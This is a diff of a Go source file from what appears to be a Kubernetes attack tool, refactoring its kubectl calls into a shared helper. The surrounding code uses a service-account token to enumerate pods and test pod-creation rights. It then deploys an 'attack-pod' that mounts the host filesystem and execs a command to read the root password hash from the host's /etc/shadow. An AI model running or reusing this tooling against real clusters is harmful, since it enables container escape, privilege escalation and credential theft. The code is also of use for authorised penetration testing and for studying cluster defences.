@@ -21,6 +21,7 @@ import (
 	"os/exec"
 	"regexp"
 	"strings"
+	"bytes"
 	"time" // Time modules
 
 	// kubernetes client
@@ -82,14 +83,14 @@ func get_pod_list(connectionString config.ServerInfo) []string {
 
 	var pods []string
 
-	get_pods_raw, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "get", "pods").Output()
+	getPodsRaw, _, err := runKubectlSimple(connectionString, "get", "pods")
 	if err != nil {
 		log.Fatal(err)
 	}
 	// Iterate over kubectl get pods, stripping off the first line which matches NAME and then grabbing the first column
 
-	get_pods_lines := strings.Split(string(get_pods_raw), "\n")
-	for _, line := range get_pods_lines {
+	lines := strings.Split(string(getPodsRaw), "\n")
+	for _, line := range lines {
 		matched, err := regexp.MatchString(`^\s*$`, line)
 		if err != nil {
 			log.Fatal(err)
@@ -110,12 +111,12 @@ func get_pod_list(connectionString config.ServerInfo) []string {
 
 // getHostname() runs kubectl with connection string to get hostname from pod
 func getHostname(connectionString config.ServerInfo, PodName string) string {
-	pod_hostname, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "exec", "-it", PodName, "hostname").Output()
+	hostname, _, err := runKubectlSimple(connectionString, "exec", "-it", PodName, "hostname")
 	if err != nil {
 		fmt.Println("- Checking for hostname of pod "+PodName+" failed: ", err)
 		return "- Pod command exec failed for " + PodName + "\n"
 	} else {
-		return "+ Pod discovered: " + string(pod_hostname)
+		return "+ Pod discovered: " + string(hostname)
 	}
 }
 
@@ -148,32 +149,23 @@ func runKubectlWithConfig(cfg config.ServerInfo, stdin io.Reader, stdout, stderr
 // runKubectlSimple executes runKubectlWithConfig, but supplies nothing for stdin, and aggregates
 // the stdout and stderr streams into strings. It returns (stdout, stderr, execution error).
 // This function is what you want to use most of the time.
-func runKubectlSimple(cfg config.ServerInfo, cmdArgs ...string) (string, string, error) {
+func runKubectlSimple(cfg config.ServerInfo, cmdArgs ...string) ([]byte, []byte, error) {
 	stdin := strings.NewReader("")
-	stdout := strings.Builder{}
-	stderr := strings.Builder{}
+	stdout := bytes.Buffer{}
+	stderr := bytes.Buffer{}
 
 	err := runKubectlWithConfig(cfg, stdin, &stdout, &stderr, cmdArgs...)
 
-	return stdout.String(), stderr.String(), err
-}
-
-func runKubectlExec(cfg config.ServerInfo, pod string, cmdArgs ...string) (string, string, error) {
-	execArgs := []string{
-		"exec",
-		"-it",
-		pod,
-	}
-	return runKubectlSimple(cfg, append(execArgs, cmdArgs...)...)
+	return stdout.Bytes(), stderr.Bytes(), err
 }
 
 // canCreatePods() runs kubectl to check if current token can create a pod
 func canCreatePods(connectionString config.ServerInfo) bool {
-	can_I_raw, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "auth", "can-i", "create", "pod").Output()
+	canCreateRaw, _, err := runKubectlSimple(connectionString, "auth", "can-i", "create", "pod")
 	if err != nil {
 		return false
 	} else {
-		if strings.Contains(string(can_I_raw), "yes") {
+		if strings.Contains(string(canCreateRaw), "yes") {
 			return true
 		} else {
 			return false
@@ -263,7 +255,10 @@ func Mount_RootFS(all_pods_listme []string, connectionString config.ServerInfo) 
 	//# Parse yaml output to get the image name
 	//image_name = `grep "- image" yaml_output | awk '{print $3}'`
 
-	get_images_raw, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "get", "pods", all_pods_listme[3], "-o", "yaml").Output()
+	get_images_raw, _, err := runKubectlSimple(connectionString, "get", "pods", all_pods_listme[3], "-o", "yaml")
+	if err != nil {
+		log.Fatal(err)
+	}
 
 	get_image_lines := strings.Split(string(get_images_raw), "\n")
 
@@ -310,14 +305,14 @@ spec:
 	// Write yaml file out to current directory
 	ioutil.WriteFile("attack-pod.yaml", []byte(Mount_InfoVars.yaml_build), 0700)
 
-	_, err = exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "apply", "-f", "attack-pod.yaml").Output()
+	_, _, err = runKubectlSimple(connectionString, "apply", "-f", "attack-pod.yaml")
 	if err != nil {
 		log.Fatal(err)
 	} else {
 		attack_pod_name := "attack-pod-" + random_string
 		println("Executing code in " + attack_pod_name + " to get its underlying host's root password hash")
 		time.Sleep(2 * time.Second)
-		shadow_file_bs, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "exec", "-it", attack_pod_name, "grep", "root", "/root/etc/shadow").Output()
+		shadow_file_bs, _, err := runKubectlSimple(connectionString, "exec", "-it", attack_pod_name, "grep", "root", "/root/etc/shadow")
 		if err != nil {
 			log.Fatal(err)
 		} else {
@@ -389,16 +384,9 @@ func main() {
 
 	pod_creation := canCreatePods(connectionString)
 	if pod_creation {
-		println("- This token can create pods on the cluster")
+		println("+ This token can create pods on the cluster")
 	} else {
 		println(" This token cannot create pods on the cluster")
-	}
-
-	println("Testing `hostname` execution via kubectl library: ")
-	for _, pod := range all_pods {
-		println("Testing against pod: " + pod)
-		host, _, _ := runKubectlExec(connectionString, pod, "hostname")
-		print(host)
 	}
 
 	Mount_RootFS(all_pods, connectionString)
